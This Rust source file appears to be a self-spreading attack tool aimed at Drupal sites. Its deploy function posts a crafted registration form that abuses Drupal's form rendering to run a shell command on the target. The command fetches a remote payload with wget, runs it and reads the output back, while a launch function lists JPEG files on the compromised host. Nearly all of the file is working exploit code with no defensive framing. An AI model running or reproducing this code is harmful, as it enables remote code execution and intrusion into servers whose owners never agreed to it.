extern crate reqwest;

extern crate walkdir;
use reqwest::{get, Client};
use std::env::current_dir;
use std::ffi::OsStr;
use walkdir::WalkDir;

pub async fn deploy(target: &str, payload: &str) -> Result<String, Box<dyn std::error::Error>> {
    let client = Client::new();
    let endpoint = "user/register";
    let query = "element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax";
    let req = [
        ("form_id", "user_register_form"),
        ("_drupal_ajax", "1"),
        ("mail[#post_render][]", "exec"),
        ("mail[#type]", "markup"),
        (
            "mail[#markup]",
            &format!(
                "echo 'wget {} -O ~/payload && chmod +x ~/payload && ~/payload launch' | bash > \"$(pwd)/payload.log\" 2>&1",
                payload
            )[..],
        ),
    ];

    let resp = client
        .post(&format!("http://{}/{}?{}", target, endpoint, query)[..])
        .form(&req)
        .send()
        .await?;

    resp.error_for_status()?;

    Ok(get(&format!("http://{}/payload.log", target)[..])
        .await?
        .text()
        .await?)
}

pub fn launch() -> Result<(), Box<dyn std::error::Error>> {
    for entry in WalkDir::new(current_dir()?)
        .into_iter()
        .filter_map(|e| e.ok())
        .filter(|e| !e.file_type().is_dir())
        .filter(|e| match e.path().extension().and_then(OsStr::to_str) {
            Some("jpeg") => true,
            Some("jpg") => true,
            _ => false,
        })
    {
        println!("Found: {}", entry.path().display());
    }

    Ok(())
}
